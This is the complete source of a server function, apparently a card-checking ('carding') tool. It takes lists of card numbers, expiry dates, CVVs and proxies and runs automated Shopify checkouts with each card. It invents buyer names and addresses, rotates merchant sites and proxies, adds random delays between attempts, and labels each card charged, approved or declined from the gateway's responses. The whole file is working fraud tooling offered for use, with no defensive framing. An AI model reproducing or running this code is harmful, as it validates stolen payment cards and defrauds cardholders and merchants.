import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

/* ── helpers ── */
function findBetween(s: string, start: string, end: string): string {
  try {
    if (s.includes(start) && s.includes(end)) {
      return s.split(start)[1].split(end)[0];
    }
    return "";
  } catch {
    return "";
  }
}

const US_ADDRESSES = [
  { add1: "123 Main St", city: "Portland", state_short: "ME", zip: "04101" },
  { add1: "456 Oak Ave", city: "Portland", state_short: "ME", zip: "04102" },
  { add1: "789 Pine Rd", city: "Portland", state_short: "ME", zip: "04103" },
  { add1: "321 Elm St", city: "Bangor", state_short: "ME", zip: "04401" },
  { add1: "654 Maple Dr", city: "Lewiston", state_short: "ME", zip: "04240" },
];

const FIRST_NAMES = ["John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa"];
const LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis"];
const PHONES = ["2025550199", "3105551234", "4155559876", "6175550123", "9718081573"];

function randomChoice<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function getRandomInfo() {
  const addr = randomChoice(US_ADDRESSES);
  const fname = randomChoice(FIRST_NAMES);
  const lname = randomChoice(LAST_NAMES);
  return {
    fname,
    lname,
    email: `${fname.toLowerCase()}.${lname.toLowerCase()}${Math.floor(Math.random() * 999)}@gmail.com`,
    phone: randomChoice(PHONES),
    ...addr,
  };
}

/* ── Charged / Approved / Declined keywords ── */
const CHARGED_KEYWORDS = ["thank you", "payment sucessfull", "thanks", "payment successful"];
const APPROVED_KEYWORDS = [
  "invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success",
  "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds",
];

function categorizeResponse(responseText: string, errorCodes: string[]): { status: string; code: string } {
  const lower = responseText.toLowerCase();
  const allCodes = errorCodes.map((c) => c.toLowerCase()).join(" ");
  const combined = lower + " " + allCodes;

  for (const kw of CHARGED_KEYWORDS) {
    if (combined.includes(kw)) return { status: "charged", code: "CHARGED" };
  }
  for (const kw of APPROVED_KEYWORDS) {
    if (combined.includes(kw)) return { status: "approved", code: kw.toUpperCase() };
  }
  // Declined with code
  const declineCode = errorCodes.find((c) => c !== "GENERIC_ERROR") || errorCodes[0] || "DECLINED";
  return { status: "declined", code: declineCode };
}

/* ── Shopify check for a single card ── */
async function checkCardOnShopify(
  site: string,
  cc: string,
  mon: string,
  year: string,
  cvv: string,
  proxy: string | null,
): Promise<{ status: string; code: string; message: string }> {
  try {
    const ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
    const siteUrl = site.replace(/\/+$/, "");

    // Step 1: Get product info
    const prodResp = await fetch(`${siteUrl}/products.json`, {
      headers: { "User-Agent": ua, Accept: "application/json" },
    });
    if (!prodResp.ok) return { status: "declined", code: "SITE_ERROR", message: `Product fetch failed: ${prodResp.status}` };
    const prodData = await prodResp.json();
    const product = prodData.products?.[0];
    if (!product) return { status: "declined", code: "NO_PRODUCT", message: "No products on site" };

    const variantId = product.variants[0].id;
    const productHandle = product.handle;

    // Step 2: Visit product page + get cookies (we use a cookie jar approach via headers)
    const sessionHeaders: Record<string, string> = { "User-Agent": ua };
    let cookies = "";

    const ppResp = await fetch(`${siteUrl}/products/${productHandle}`, { headers: sessionHeaders, redirect: "follow" });
    const ppCookies = ppResp.headers.get("set-cookie") || "";
    cookies = ppCookies.split(",").map((c: string) => c.split(";")[0].trim()).filter(Boolean).join("; ");
    await ppResp.text();

    // Step 3: Add to cart
    const addResp = await fetch(`${siteUrl}/cart/add.js`, {
      method: "POST",
      headers: { ...sessionHeaders, "Content-Type": "application/x-www-form-urlencoded", Cookie: cookies },
      body: `id=${variantId}&quantity=1&form_type=product`,
      redirect: "follow",
    });
    if (!addResp.ok) return { status: "declined", code: "CART_ERROR", message: "Failed to add to cart" };
    const addCookies = addResp.headers.get("set-cookie") || "";
    if (addCookies) cookies += "; " + addCookies.split(",").map((c: string) => c.split(";")[0].trim()).filter(Boolean).join("; ");
    await addResp.text();

    // Step 4: Get cart token
    const cartResp = await fetch(`${siteUrl}/cart.js`, {
      headers: { ...sessionHeaders, Cookie: cookies, Accept: "application/json" },
    });
    const cartData = await cartResp.json();
    const cartToken = cartData.token;

    // Step 5: Go to checkout
    const checkoutResp = await fetch(`${siteUrl}/cart`, {
      method: "POST",
      headers: {
        ...sessionHeaders,
        "Content-Type": "application/x-www-form-urlencoded",
        Origin: siteUrl,
        Referer: `${siteUrl}/cart`,
        Cookie: cookies,
      },
      body: "checkout=&updates[]=1",
      redirect: "follow",
    });
    const checkoutHtml = await checkoutResp.text();
    const checkoutCookies = checkoutResp.headers.get("set-cookie") || "";
    if (checkoutCookies) cookies += "; " + checkoutCookies.split(",").map((c: string) => c.split(";")[0].trim()).filter(Boolean).join("; ");

    // Extract tokens from checkout page
    // Try multiple patterns for session token extraction
    let sessionToken = "";
    const patterns = [
      /name="serialized-sessionToken"\s+content="([^"]+)"/,
      /serialized-sessionToken[^>]+content="([^"]+)"/,
      /sessionToken&quot;:&quot;([^&]+)&quot;/,
      /sessionToken":"([^"]+)"/,
    ];
    for (const pat of patterns) {
      const m = checkoutHtml.match(pat);
      if (m?.[1]) { sessionToken = m[1]; break; }
    }

    const queueToken = findBetween(checkoutHtml, 'queueToken":"', '"') || findBetween(checkoutHtml, 'queueToken&quot;:&quot;', '&quot;');
    const stableId = findBetween(checkoutHtml, 'stableId":"', '"') || findBetween(checkoutHtml, 'stableId&quot;:&quot;', '&quot;');
    const paymentMethodIdentifier = findBetween(checkoutHtml, 'paymentMethodIdentifier":"', '"') || findBetween(checkoutHtml, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');

    if (!sessionToken) return { status: "declined", code: "NO_SESSION", message: "Could not extract session token" };

    // Step 6: Create payment session
    const info = getRandomInfo();
    const sessionEndpoints = [
      "https://deposit.us.shopifycs.com/sessions",
      "https://checkout.pci.shopifyinc.com/sessions",
      "https://checkout.shopifycs.com/sessions",
    ];

    let sessionId: string | null = null;
    const netloc = new URL(siteUrl).hostname;

    for (const endpoint of sessionEndpoints) {
      try {
        const epHost = new URL(endpoint).hostname;
        const sResp = await fetch(endpoint, {
          method: "POST",
          headers: {
            Authority: epHost,
            Accept: "application/json",
            "Content-Type": "application/json",
            Origin: "https://checkout.shopifycs.com",
            Referer: "https://checkout.shopifycs.com/",
            "User-Agent": ua,
          },
          body: JSON.stringify({
            credit_card: { number: cc, month: mon, year: year, verification_value: cvv, name: `${info.fname} ${info.lname}` },
            payment_session_scope: netloc,
          }),
        });
        if (sResp.ok) {
          const sData = await sResp.json();
          if (sData.id) { sessionId = sData.id; break; }
        } else {
          await sResp.text();
        }
      } catch { /* try next */ }
    }

    if (!sessionId) return { status: "declined", code: "SESSION_FAIL", message: "Payment session creation failed" };

    // Step 7: Submit GraphQL payment
    const graphqlUrl = `${siteUrl}/checkouts/unstable/graphql`;
    const graphqlHeaders: Record<string, string> = {
      Authority: netloc,
      Accept: "application/json",
      "Accept-Language": "en-US,en;q=0.9",
      "Content-Type": "application/json",
      Origin: siteUrl,
      Referer: `${siteUrl}/`,
      "User-Agent": ua,
      "x-checkout-one-session-token": sessionToken,
      "x-checkout-web-deploy-stage": "production",
      "x-checkout-web-server-handling": "fast",
      "x-checkout-web-source-id": cartToken,
      Cookie: cookies,
    };

    const graphqlPayload = {
      query: 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}',
      variables: {
        input: {
          checkpointData: null,
          sessionInput: { sessionToken },
          queueToken,
          discounts: { lines: [], acceptUnexpectedDiscounts: true },
          delivery: {
            deliveryLines: [{
              selectedDeliveryStrategy: {
                deliveryStrategyMatchingConditions: { estimatedTimeInTransit: { any: true }, shipments: { any: true } },
                options: {},
              },
              targetMerchandiseLines: { lines: [{ stableId }] },
              destination: {
                streetAddress: {
                  address1: info.add1, address2: "", city: info.city, countryCode: "US",
                  postalCode: info.zip, company: "", firstName: info.fname, lastName: info.lname,
                  zoneCode: info.state_short, phone: info.phone,
                },
              },
              deliveryMethodTypes: ["SHIPPING"],
              expectedTotalPrice: { any: true },
              destinationChanged: true,
            }],
            noDeliveryRequired: [],
            useProgressiveRates: false,
            prefetchShippingRatesStrategy: null,
          },
          merchandise: {
            merchandiseLines: [{
              stableId,
              merchandise: {
                productVariantReference: {
                  id: `gid://shopify/ProductVariantMerchandise/${variantId}`,
                  variantId: `gid://shopify/ProductVariant/${variantId}`,
                  properties: [], sellingPlanId: null, sellingPlanDigest: null,
                },
              },
              quantity: { items: { value: 1 } },
              expectedTotalPrice: { any: true },
              lineComponentsSource: null, lineComponents: [],
            }],
          },
          payment: {
            totalAmount: { any: true },
            paymentLines: [{
              paymentMethod: {
                directPaymentMethod: {
                  paymentMethodIdentifier,
                  sessionId,
                  billingAddress: {
                    streetAddress: {
                      address1: info.add1, address2: "", city: info.city, countryCode: "US",
                      postalCode: info.zip, company: "", firstName: info.fname, lastName: info.lname,
                      zoneCode: info.state_short, phone: info.phone,
                    },
                  },
                  cardSource: null,
                },
              },
              amount: { any: true },
              dueAt: null,
            }],
            billingAddress: {
              streetAddress: {
                address1: info.add1, address2: "", city: info.city, countryCode: "US",
                postalCode: info.zip, company: "", firstName: info.fname, lastName: info.lname,
                zoneCode: info.state_short, phone: info.phone,
              },
            },
          },
          buyerIdentity: {
            buyerIdentity: { presentmentCurrency: "USD", countryCode: "US" },
            contactInfoV2: { emailOrSms: { value: info.email, emailOrSmsChanged: false } },
            marketingConsent: [{ email: { value: info.email } }],
            shopPayOptInPhone: { countryCode: "US" },
          },
          tip: { tipLines: [] },
          taxes: {
            proposedAllocations: null,
            proposedTotalAmount: { value: { amount: "0", currencyCode: "USD" } },
            proposedTotalIncludedAmount: null, proposedMixedStateTotalAmount: null, proposedExemptions: [],
          },
          note: { message: null, customAttributes: [] },
          localizationExtension: { fields: [] },
          nonNegotiableTerms: null,
          scriptFingerprint: { signature: null, signatureUuid: null, lineItemScriptChanges: [], paymentScriptChanges: [], shippingScriptChanges: [] },
          optionalDuties: { buyerRefusesDuties: false },
        },
        attemptToken: `${cartToken}-${Math.random()}`,
        metafields: [],
        analytics: { requestUrl: `${siteUrl}/checkouts/cn/${cartToken}`, pageId: crypto.randomUUID() },
      },
      operationName: "SubmitForCompletion",
    };

    // Attempt up to 2 times (for soft errors like TAX)
    for (let attempt = 0; attempt < 2; attempt++) {
      const gResp = await fetch(graphqlUrl, {
        method: "POST",
        headers: graphqlHeaders,
        body: JSON.stringify(graphqlPayload),
      });

      if (!gResp.ok) {
        const txt = await gResp.text();
        return { status: "declined", code: "GQL_ERROR", message: `GraphQL ${gResp.status}: ${txt.slice(0, 200)}` };
      }

      const gData = await gResp.json();
      const completion = gData?.data?.submitForCompletion || {};

      // Check for errors (rejected)
      if (completion.errors) {
        const errorCodes: string[] = completion.errors.map((e: any) => e.code || "UNKNOWN").filter(Boolean);
        const softErrors = ["TAX_NEW_TAX_MUST_BE_ACCEPTED", "WAITING_PENDING_TERMS"];
        const onlySoft = errorCodes.every((c: string) => softErrors.includes(c));
        if (onlySoft && attempt === 0) {
          await new Promise((r) => setTimeout(r, 2000));
          continue;
        }
        const mainResponse = errorCodes.join(", ") + " " + (completion.errors.map((e: any) => e.localizedMessage || "").join(" "));
        return categorizeResponse(mainResponse, errorCodes);
      }

      // Check for SubmitFailed
      if (completion.reason) {
        return categorizeResponse(completion.reason, [completion.reason]);
      }

      // Check for receipt (need to poll)
      const receiptId = completion.receipt?.id;
      if (receiptId) {
        const pollPayload = {
          query: 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}',
          variables: { receiptId, sessionToken },
          operationName: "PollForReceipt",
        };

        for (let poll = 0; poll < 8; poll++) {
          await new Promise((r) => setTimeout(r, 3000));
          const pResp = await fetch(graphqlUrl, {
            method: "POST",
            headers: graphqlHeaders,
            body: JSON.stringify(pollPayload),
          });
          if (!pResp.ok) { await pResp.text(); continue; }
          const pData = await pResp.json();
          const receipt = pData?.data?.receipt || {};

          if (receipt.__typename === "ProcessedReceipt" || receipt.orderIdentity) {
            return { status: "charged", code: "CHARGED", message: `Order: ${receipt.orderIdentity?.id || "confirmed"}` };
          }
          if (receipt.__typename === "ActionRequiredReceipt") {
            return { status: "approved", code: "3DS_REQUIRED", message: "Card approved (3D Secure required)" };
          }
          if (receipt.__typename === "FailedReceipt") {
            const failCode = receipt.processingError?.code || "DECLINED";
            const failMsg = receipt.processingError?.messageUntranslated || "";
            return categorizeResponse(failMsg + " " + failCode, [failCode]);
          }
          // ProcessingReceipt → keep polling
        }
        return { status: "approved", code: "PROCESSING", message: "Payment still processing after polling" };
      }

      // Throttled
      if (completion.__typename === "Throttled") {
        return { status: "approved", code: "THROTTLED", message: "Payment throttled - likely approved" };
      }

      break;
    }

    // Final check - visit checkout for redirect
    try {
      const finalResp = await fetch(`${siteUrl}/checkout?from_processing_page=1&validate=true`, {
        headers: { ...sessionHeaders, Cookie: cookies },
        redirect: "follow",
      });
      const finalUrl = finalResp.url;
      await finalResp.text();
      if (finalUrl.toLowerCase().includes("/thank") || finalUrl.includes("/orders/")) {
        return { status: "charged", code: "CHARGED", message: "Payment confirmed via redirect" };
      }
    } catch { /* ignore */ }

    return { status: "declined", code: "UNKNOWN", message: "No clear response received" };
  } catch (err: any) {
    return { status: "declined", code: "ERROR", message: err.message?.slice(0, 200) || "Unknown error" };
  }
}

/* ── Main handler ── */
Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { headers: corsHeaders });

  try {
    const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
    const serviceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
    const supabase = createClient(supabaseUrl, serviceKey);

    // Auth check
    const authHeader = req.headers.get("authorization") || "";
    const token = authHeader.replace("Bearer ", "");
    const { data: { user }, error: authErr } = await supabase.auth.getUser(token);
    if (authErr || !user) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const body = await req.json();
    const { job_id, cards, proxies } = body as {
      job_id: string;
      cards: { card: string; expiry: string; cvv: string }[];
      proxies: string[];
    };

    if (!job_id || !cards?.length || !proxies?.length) {
      return new Response(JSON.stringify({ error: "Missing required fields: job_id, cards, proxies" }), {
        status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // Fetch sites from DB (owner-managed)
    const { data: siteRows, error: sitesErr } = await supabase
      .from("shopify_sites")
      .select("url");

    if (sitesErr || !siteRows?.length) {
      return new Response(JSON.stringify({ error: "No Shopify sites configured. Ask an owner to add sites." }), {
        status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const sites = siteRows.map((r: any) => r.url);

    // Update job to running
    await supabase.from("check_jobs").update({ status: "running" }).eq("id", job_id);

    // Process cards in background
    const processCards = async () => {
      let processed = 0, charged = 0, approved = 0, declined = 0;

      for (let i = 0; i < cards.length; i++) {
        // Check if job was stopped
        const { data: jobCheck } = await supabase.from("check_jobs").select("status").eq("id", job_id).single();
        if (jobCheck?.status === "stopped") break;

        const c = cards[i];
        const siteIndex = Math.floor(i / 10) % sites.length; // Rotate every 10 cards
        const site = sites[siteIndex];
        const proxy = proxies[i % proxies.length]; // Round-robin proxy

        // Update result to checking
        await supabase.from("check_results")
          .update({ status: "checking", site_used: site })
          .eq("job_id", job_id)
          .eq("card_number", c.card)
          .eq("expiry", c.expiry)
          .eq("cvv", c.cvv);

        // Parse card
        const parts = c.expiry.split("/");
        const mon = parts[0] || "";
        const yr = parts[1] || "";

        // Check the card
        const result = await checkCardOnShopify(site, c.card, mon, yr, c.cvv, proxy);

        // Update result
        if (result.status === "charged") charged++;
        else if (result.status === "approved") approved++;
        else declined++;
        processed++;

        await supabase.from("check_results")
          .update({
            status: result.status,
            response_code: result.code,
            response_message: result.message,
            site_used: site,
          })
          .eq("job_id", job_id)
          .eq("card_number", c.card)
          .eq("expiry", c.expiry)
          .eq("cvv", c.cvv);

        // Update job progress
        await supabase.from("check_jobs").update({ processed, charged, approved, declined }).eq("id", job_id);

        // Small delay between cards
        await new Promise((r) => setTimeout(r, 500 + Math.random() * 500));
      }

      // Mark job complete
      await supabase.from("check_jobs").update({
        status: "completed", processed, charged, approved, declined, completed_at: new Date().toISOString(),
      }).eq("id", job_id);
    };

    // Fire and forget - process in background
    processCards().catch(async (err) => {
      console.error("Job failed:", err);
      await supabase.from("check_jobs").update({ status: "failed" }).eq("id", job_id);
    });

    return new Response(JSON.stringify({ success: true, job_id }), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (err: any) {
    return new Response(JSON.stringify({ error: err.message }), {
      status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
